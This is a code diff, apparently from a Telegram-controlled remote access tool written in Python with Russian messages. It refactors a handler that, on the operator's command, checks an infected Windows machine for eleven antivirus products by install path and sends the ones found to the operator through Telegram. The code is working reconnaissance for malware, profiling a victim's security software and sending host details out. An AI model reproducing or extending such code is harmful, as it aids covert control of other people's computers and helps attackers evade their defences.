@@ -33,27 +33,38 @@ def Screen(dp, bot, admin_id):
 
 
 
-def Antiviruses(dp, bot, admin_id):
+def Antiviruses(dp: Dispatcher, bot, admin_id: int):
     @dp.message_handler(text_contains='Антивирусы')
     async def antiviruses(message: types.Message):
         if message.from_user.id == admin_id:
-            await bot.send_message(admin_id, 'Понял тебя. Cейчас скину cписок антивирусов ПК 🤖')
+            await bot.send_message(admin_id, 'Понял тебя. Сейчас скину список антивирусов ПК 🤖')
+            
             Antiviruses = {
-                'C:\\Program Files\\Windows Defender': 'Windows Defender',
-                'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
-                'C:\\Program Files\\AVG\\Antivirus': 'AVG',
-                'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
-                'C:\\Program Files (x86)\\IObit\\Advanced sysCare': 'Advanced sysCare',
-                'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
-                'C:\\Program Files\\DrWeb': 'Dr.Web',
-                'C:\\Program Files\\ESET\\ESET Security': 'ESET',
-                'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
-                'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
-                'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
+                r'C:\Program Files\Windows Defender': 'Windows Defender',
+                r'C:\Program Files\AVAST Software\Avast': 'Avast',
+                r'C:\Program Files\AVG\Antivirus': 'AVG',
+                r'C:\Program Files (x86)\Avira\Launcher': 'Avira',
+                r'C:\Program Files (x86)\IObit\Advanced SystemCare': 'Advanced SystemCare',
+                r'C:\Program Files\Bitdefender Antivirus Free': 'Bitdefender',
+                r'C:\Program Files\DrWeb': 'Dr.Web',
+                r'C:\Program Files\ESET\ESET Security': 'ESET',
+                r'C:\Program Files (x86)\Kaspersky Lab': 'Kaspersky Lab',
+                r'C:\Program Files (x86)\360\Total Security': '360 Total Security',
+                r'C:\Program Files\ESET\ESET NOD32 Antivirus': 'ESET NOD32'
             }
-            Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
-            AntivirusesAll = '\n'.join(Antivirus)
-            await bot.send_message(admin_id, "<code>"+ AntivirusesAll + "</code>", parse_mode='HTML')
+            
+            # Сбор существующих антивирусов
+            found_antiviruses = []
+            for path, name in Antiviruses.items():
+                if os.path.exists(path):
+                    found_antiviruses.append(name)
+            
+            # Формирование ответа
+            if found_antiviruses:
+                AntivirusesAll = '\n'.join(found_antiviruses)
+                await bot.send_message(admin_id, f"<code>{AntivirusesAll}</code>", parse_mode='HTML')
+            else:
+                await bot.send_message(admin_id, "<code>Антивирусы не обнаружены на системе</code>", parse_mode='HTML')
 
 
 
